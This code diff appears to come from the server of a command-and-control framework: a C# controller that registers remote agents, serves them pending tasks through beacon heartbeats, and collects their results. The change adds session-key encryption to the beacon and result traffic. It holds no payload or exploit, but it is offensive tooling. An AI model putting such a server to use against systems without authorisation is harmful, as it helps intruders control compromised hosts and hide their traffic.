@@ -36,10 +36,14 @@ public class AgentCommsController : ControllerBase
         if (agent == null)
             return StatusCode(500, new { error = "registration failed" });
 
+        // Establish AES-256 session key (RSA-OAEP encrypted with the agent's public key).
+        var sessionKey = _commsService.EstablishSessionKey(agent.Id, request.PublicKey);
+
         var profile = _commsService.GetActiveProfile();
         var response = new
         {
             agent_id = agent.Id,
+            session_key = sessionKey,
             heartbeat_url = profile.GetHeartbeatUrl("/api/beacon"),
             result_url = profile.GetResultUrl("/api/beacon"),
             ws_url = profile.GetWebSocketUrl(""),
@@ -73,36 +77,78 @@ public class AgentCommsController : ControllerBase
     }
 
     [HttpPost("heartbeat")]
-    public async Task<IActionResult> Heartbeat([FromBody] object encryptedPayload)
+    public async Task<IActionResult> Heartbeat([FromBody] JsonElement? body)
     {
         var agentId = Request.Headers["X-Agent-Id"].FirstOrDefault();
         if (string.IsNullOrEmpty(agentId))
             return BadRequest(new { error = "missing agent id" });
 
         var bytesReceived = Request.ContentLength ?? 0;
+
+        // Authenticate + decrypt the heartbeat payload with the session key.
+        if (!_commsService.TryGetSessionKey(agentId, out var key) || key is null)
+            return Unauthorized(new { error = "session not established" });
+
+        if (body is not { } el || !el.TryGetProperty("payload", out var p) || p.GetString() is not string payload)
+            return BadRequest(new { error = "missing payload" });
+
+        string heartbeatJson;
+        try
+        {
+            heartbeatJson = CryptoHelper.DecryptPayload(payload, key);
+        }
+        catch (Exception)
+        {
+            return Unauthorized(new { error = "decrypt failed" });
+        }
+
         var (valid, task, hostname) = await _commsService.HandleHeartbeatAsync(agentId);
         if (!valid)
             return NotFound(new { error = "agent not found" });
 
         var response = new HeartbeatResponse { PendingTask = task };
-        var responseJson = System.Text.Json.JsonSerializer.Serialize(response);
-        var bytesSent = System.Text.Encoding.UTF8.GetByteCount(responseJson);
+        var responseJson = JsonSerializer.Serialize(response);
+
+        // Encrypt the response with the session key.
+        var encryptedResponse = CryptoHelper.EncryptPayload(responseJson, key);
+        var bytesSent = Encoding.UTF8.GetByteCount(encryptedResponse);
 
         _commsService.RecordTraffic(agentId, hostname, bytesReceived, bytesSent);
 
-        return Ok(response);
+        return Ok(new { payload = encryptedResponse });
     }
 
     [HttpPost("result")]
-    public async Task<IActionResult> SubmitResult([FromBody] TaskResult result)
+    public async Task<IActionResult> SubmitResult([FromBody] JsonElement? body)
     {
         var agentId = Request.Headers["X-Agent-Id"].FirstOrDefault();
         if (string.IsNullOrEmpty(agentId))
             return BadRequest(new { error = "missing agent id" });
 
         var bytesReceived = Request.ContentLength ?? 0;
-        var responseJson = System.Text.Json.JsonSerializer.Serialize(new { status = "received" });
-        var bytesSent = System.Text.Encoding.UTF8.GetByteCount(responseJson);
+
+        if (!_commsService.TryGetSessionKey(agentId, out var key) || key is null)
+            return Unauthorized(new { error = "session not established" });
+
+        if (body is not { } el || !el.TryGetProperty("payload", out var p) || p.GetString() is not string payload)
+            return BadRequest(new { error = "missing payload" });
+
+        TaskResult? result;
+        try
+        {
+            var plain = CryptoHelper.DecryptPayload(payload, key);
+            result = JsonSerializer.Deserialize<TaskResult>(plain);
+        }
+        catch (Exception)
+        {
+            return Unauthorized(new { error = "decrypt failed" });
+        }
+
+        if (result is null)
+            return BadRequest(new { error = "invalid payload" });
+
+        var responseJson = JsonSerializer.Serialize(new { status = "received" });
+        var bytesSent = Encoding.UTF8.GetByteCount(responseJson);
         var success = await _commsService.HandleResultAsync(agentId, result, bytesReceived, bytesSent);
         if (!success)
             return NotFound(new { error = "invalid task" });
